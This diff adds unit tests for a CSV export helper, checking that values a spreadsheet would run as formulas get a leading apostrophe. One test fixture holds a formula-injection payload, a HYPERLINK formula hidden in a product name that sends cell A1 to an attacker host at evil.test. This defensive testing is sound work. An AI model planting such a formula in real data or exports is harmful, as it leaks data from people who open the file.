@@ -1,6 +1,30 @@
 import { describe, it, expect } from 'vitest';
-import { toCsv, transactionsToCsvRows } from '../../src/lib/csv';
+import { toCsv, transactionsToCsvRows, neutralizeFormula } from '../../src/lib/csv';
 import { SaleTransaction } from '../../src/types';
+
+describe('neutralizeFormula', () => {
+  it('prefixes values a spreadsheet would execute as a formula', () => {
+    for (const payload of ['=1+1', '+1', '-1', '@SUM(A1)', '\tx', '\rx']) {
+      expect(neutralizeFormula(payload)).toBe(`'${payload}`);
+    }
+  });
+
+  it('leaves ordinary values untouched', () => {
+    for (const value of ['Latte', '3.50', '', 'a=b', 'Jo-Anne']) {
+      expect(neutralizeFormula(value)).toBe(value);
+    }
+  });
+
+  it('neutralizes a formula smuggled in through a product name', () => {
+    // A product named to pull data out of whoever opens the export.
+    const attack = '=HYPERLINK("http://evil.test?"&A1,"click")';
+    const csv = toCsv([{ product: attack }]);
+    // Quoted (it contains commas/quotes) with inner quotes doubled per RFC-4180,
+    // and the leading = defused so the cell is read as text.
+    expect(csv).toBe(`product\n"'${attack.replace(/"/g, '""')}"`);
+    expect(csv.startsWith('product\n"\'=')).toBe(true);
+  });
+});
 
 describe('toCsv', () => {
   it('emits a header and rows', () => {
